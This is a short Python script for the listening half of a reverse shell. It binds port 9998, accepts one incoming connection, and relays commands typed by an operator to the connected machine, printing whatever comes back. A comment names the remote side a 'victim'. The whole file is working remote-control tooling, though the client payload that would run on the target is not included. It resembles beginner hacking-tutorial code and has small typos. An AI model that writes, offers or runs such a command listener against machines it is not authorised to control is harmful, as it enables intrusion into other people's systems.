#!/usr/bin/env python3
import socket
import sys


#create a socket
def create_socket():
    try:
        global host
        global port 
        global s
        host=""
        port=9998
        s= socket.socket()
    except socket.error as msg:
        print("socket creation error:" + str(msg))
    
#binding thhe socket and listening for connections

def bind_socket():
    try:
        global host
        global port 
        global s
        print("Binding the port"+str(port))
        tuple=host,port
        s.bind(tuple)
        s.listen(5)
    except socket.error as msg:
        print("socket binding error"+str(msg)+"/n"+"Retrying...")
        bind_socket()
#def establish connection with a client(socket must be listening)
def socket_accept():
    conn,address=s.accept()
    print("connection has been stablished! |"+"IP"+address[0]+"|port"+str(address[1]))
    send_commands(conn)
    conn.close()


# send commands to client/victi or a friend
def send_commands(conn):
    while True:
        cmd=input()
        if cmd=='quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd))>0:
            conn.send(str.encode(cmd))
            client_response=str(conn.recv(1024),"UTF_8")
            print(client_response,end="")

def main():
    create_socket()
    bind_socket()
    socket_accept()
main()
